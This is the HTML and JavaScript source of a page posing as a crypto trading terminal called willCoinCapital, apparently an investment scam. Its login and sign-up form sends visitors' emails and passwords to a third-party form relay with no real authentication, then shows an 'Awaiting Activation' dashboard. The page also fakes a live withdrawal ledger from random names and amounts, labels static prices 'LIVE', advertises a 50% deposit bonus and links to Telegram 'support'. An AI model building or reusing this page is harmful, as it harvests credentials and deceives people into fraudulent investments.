<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>willCoinCapital | Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #020817; color: white; margin: 0; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .btn-glow { box-shadow: 0 0 20px rgba(34, 211, 238, 0.4); }
        .view-hidden { display: none !important; }
        
        .bento-grid { display: grid; grid-template-columns: 1fr; gap: 1.25rem; max-width: 450px; margin: 0 auto; }

        /* MARKET BOX ANIMATION */
        .chart-line { stroke-dasharray: 100; stroke-dashoffset: 100; animation: draw 2s ease-out forwards; }
        @keyframes draw { to { stroke-dashoffset: 0; } }
        
        .pulse-text { animation: pulseOpacity 2s infinite; }
        @keyframes pulseOpacity { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }

        /* LEDGER GRID */
        .ledger-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; align-items: center; width: 100%; }
        .ledger-row { padding: 1rem; border-bottom: 1px solid rgba(255, 255, 255, 0.05); position: relative; overflow: hidden; }
        .scanline::after {
            content: ""; position: absolute; top: -100%; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, transparent, rgba(34, 211, 238, 0.08), transparent);
            animation: scan 3s linear infinite;
        }
        @keyframes scan { 0% { top: -100%; } 100% { top: 100%; } }

        .currency-symbol { font-size: 2.5rem; font-weight: 800; color: #22d3ee; text-shadow: 0 0 15px rgba(34, 211, 238, 0.6); margin-right: 8px; }
        .stagger-in { animation: slideUp 0.6s ease-out forwards; opacity: 0; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .support-float { position: fixed; bottom: 20px; right: 20px; z-index: 1000; }
    </style>
</head>
<body>

    <a href="https://t.me/willCoin_Capital" target="_blank" class="support-float flex items-center gap-2 bg-cyan-400 text-black px-5 py-3 rounded-full font-black uppercase text-[8px] tracking-widest btn-glow">
        <span class="w-1.5 h-1.5 rounded-full bg-black animate-pulse"></span> Live Support
    </a>

    <div id="main-terminal">
        <nav class="flex items-center justify-between px-6 py-6">
            <div class="text-md font-extrabold tracking-tighter uppercase">WILLCOIN<span class="text-cyan-400">CAPITAL</span></div>
            <div class="flex gap-3">
                <button onclick="toggleAuth('login')" class="text-[8px] font-bold uppercase tracking-widest text-gray-400">Login</button>
                <button onclick="toggleAuth('signup')" class="px-3 py-2 bg-cyan-400 text-black rounded-lg text-[8px] font-black uppercase tracking-widest btn-glow">Sign Up</button>
            </div>
        </nav>

        <main class="px-4 pb-20">
            <h1 class="text-2xl font-extrabold mb-8 text-center tracking-tighter uppercase leading-tight stagger-in">QUANTUM <br> TERMINAL v3.1</h1>

            <div class="bento-grid">
                
                <div class="glass p-6 rounded-[24px] border border-white/5 relative stagger-in" style="animation-delay: 0.1s;">
                    <h2 class="text-cyan-400 italic font-black uppercase text-[9px] mb-6 tracking-widest">Profit Projection</h2>
                    <div class="bg-black/40 rounded-xl p-6 border border-white/5 flex items-baseline justify-center mb-4">
                        <span class="currency-symbol">$</span>
                        <input type="number" id="depositInput" value="1000" class="w-32 bg-transparent text-left text-5xl font-bold outline-none text-white tracking-tighter">
                    </div>
                    <input type="range" id="depositSlider" min="100" max="10000" step="100" value="1000" class="w-full h-1 bg-gray-800 rounded-lg appearance-none cursor-pointer">
                    <div class="flex justify-between mt-8 pt-6 border-t border-white/5">
                        <div class="text-center"><p class="text-[7px] text-gray-500 uppercase font-bold">Invest</p><p class="text-md font-bold" id="displayInvest">$1,000</p></div>
                        <div class="text-center"><p class="text-[7px] text-cyan-400 uppercase font-bold">Bonus</p><p class="text-md font-bold text-cyan-400" id="displayBonus">$500</p></div>
                        <div class="text-center"><p class="text-[7px] text-gray-500 uppercase font-bold">Total</p><p class="text-md font-bold" id="displayTotal">$1,500</p></div>
                    </div>
                </div>

                <div class="flex gap-3 stagger-in" style="animation-delay: 0.2s;">
                    <div class="glass flex-1 p-4 rounded-[20px] border border-white/5">
                        <div class="flex justify-between items-start mb-2">
                            <span class="text-[8px] font-black text-gray-500 uppercase">BTC/USD</span>
                            <span class="text-[8px] font-bold text-green-400 pulse-text">LIVE</span>
                        </div>
                        <div class="text-lg font-bold mb-2">$64,210</div>
                        <svg viewBox="0 0 100 40" class="w-full h-10">
                            <path d="M0 35 Q 20 10, 40 25 T 80 5 T 100 15" fill="none" stroke="#22d3ee" stroke-width="2" class="chart-line"/>
                        </svg>
                    </div>
                    <div class="glass flex-1 p-4 rounded-[20px] border border-white/5">
                        <div class="flex justify-between items-start mb-2">
                            <span class="text-[8px] font-black text-gray-500 uppercase">ETH/USD</span>
                            <span class="text-[8px] font-bold text-cyan-400 pulse-text">LIVE</span>
                        </div>
                        <div class="text-lg font-bold mb-2">$3,452</div>
                        <svg viewBox="0 0 100 40" class="w-full h-10">
                            <path d="M0 30 Q 25 35, 50 15 T 75 25 T 100 5" fill="none" stroke="#a78bfa" stroke-width="2" class="chart-line"/>
                        </svg>
                    </div>
                </div>

                <div class="glass rounded-[24px] overflow-hidden border border-white/5 stagger-in" style="animation-delay: 0.3s;">
                    <div class="flex items-center gap-2 p-4 pb-0">
                        <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
                        <h2 class="text-white font-black uppercase text-[9px] tracking-widest">Withdrawal Ledger</h2>
                    </div>
                    <div class="ledger-grid p-4 bg-white/5 text-[9px] font-black uppercase text-gray-500 tracking-widest mt-2">
                        <div class="text-left">User</div>
                        <div class="text-center">Amount</div>
                        <div class="text-right">Status</div>
                    </div>
                    <div id="ledgerBody"></div>
                </div>

                <div class="glass p-6 rounded-[24px] text-center stagger-in" style="animation-delay: 0.4s;">
                    <h2 class="text-gray-500 font-black uppercase text-[9px] mb-2 tracking-widest">System Clock (UTC)</h2>
                    <div id="clock" class="text-2xl font-black tracking-tighter">00:00:00</div>
                </div>
            </div>
        </main>
    </div>

    <div id="dashboard" class="view-hidden min-h-screen bg-[#010409] p-6 text-center">
        <h2 class="text-cyan-400 font-black uppercase italic text-xl mb-8">Dashboard</h2>
        <div class="glass p-8 rounded-2xl"><p class="text-gray-400 text-sm">Awaiting Activation...</p></div>
        <button onclick="signOut()" class="mt-8 text-[9px] text-gray-500 underline uppercase tracking-widest font-bold">Sign Out</button>
    </div>

    <div id="authModal" class="fixed inset-0 z-[1100] flex items-center justify-center p-6 view-hidden">
        <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="toggleAuth()"></div>
        <div class="glass max-w-sm w-full p-8 rounded-[32px] border border-cyan-400/30 relative z-10 text-center">
            <h2 id="authTitle" class="text-lg font-black uppercase text-cyan-400 mb-6">Authorize</h2>
            <form id="authForm" class="space-y-4">
                <input type="hidden" name="access_key" value="56f62943-45be-49fc-9e75-e166e5d4d20b">
                <input type="email" name="email" placeholder="Email" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-xs outline-none">
                <input type="password" name="password" placeholder="Password" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-xs outline-none">
                <button type="submit" id="authSubmit" class="w-full py-4 bg-cyan-400 text-black font-black rounded-xl uppercase text-[9px] btn-glow">Enter Terminal</button>
            </form>
        </div>
    </div>

    <script>
        // AUTH LOGIC
        if (localStorage.getItem('isLoggedIn') === 'true') { showDashboard(); }
        function showDashboard() {
            document.getElementById('main-terminal').classList.add('view-hidden');
            document.getElementById('dashboard').classList.remove('view-hidden');
            document.getElementById('authModal').classList.add('view-hidden');
            localStorage.setItem('isLoggedIn', 'true');
        }
        function signOut() { localStorage.removeItem('isLoggedIn'); location.reload(); }
        function toggleAuth(mode) {
            const modal = document.getElementById('authModal');
            if (!mode) { modal.classList.add('view-hidden'); return; }
            document.getElementById('authTitle').innerText = mode === 'login' ? 'Login' : 'Sign Up';
            modal.classList.remove('view-hidden');
        }
        document.getElementById('authForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('authSubmit');
            btn.innerText = "Connecting...";
            try {
                await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
                showDashboard();
            } catch(e) { btn.innerText = "Try Again"; }
        };

        // CLOCK & LEDGER
        setInterval(() => { document.getElementById('clock').innerText = new Date().toISOString().substr(11, 8); }, 1000);
        const users = ["Alpha_User", "0x4e...f2", "CryptoKing", "User_772", "Btc_Hunter", "Whale_99"];
        function updateLedger() {
            const row = document.createElement('div');
            row.className = 'ledger-grid ledger-row scanline stagger-in';
            row.innerHTML = `<div class="text-gray-400 text-[10px] text-left">${users[Math.floor(Math.random()*users.length)]}</div>
                             <div class="text-center font-bold text-white text-[10px]">$${(Math.floor(Math.random()*8000)+500).toLocaleString()}</div>
                             <div class="text-right"><span class="bg-green-500/10 text-green-400 px-2 py-0.5 rounded-full text-[7px] font-black border border-green-500/20 uppercase">Completed</span></div>`;
            const body = document.getElementById('ledgerBody');
            body.prepend(row);
            if (body.children.length > 5) body.lastElementChild.remove();
        }
        for(let i=0; i<5; i++) updateLedger();
        setInterval(updateLedger, 4000);

        // CALC LOGIC
        const input = document.getElementById('depositInput');
        const slider = document.getElementById('depositSlider');
        function updateCalc(val) {
            document.getElementById('displayInvest').innerText = '$' + Number(val).toLocaleString();
            document.getElementById('displayBonus').innerText = '$' + (val * 0.5).toLocaleString();
            document.getElementById('displayTotal').innerText = '$' + (val * 1.5).toLocaleString();
        }
        input.oninput = (e) => { updateCalc(e.target.value); slider.value = e.target.value; };
        slider.oninput = (e) => { updateCalc(e.target.value); input.value = e.target.value; };
    </script>
</body>
</html>
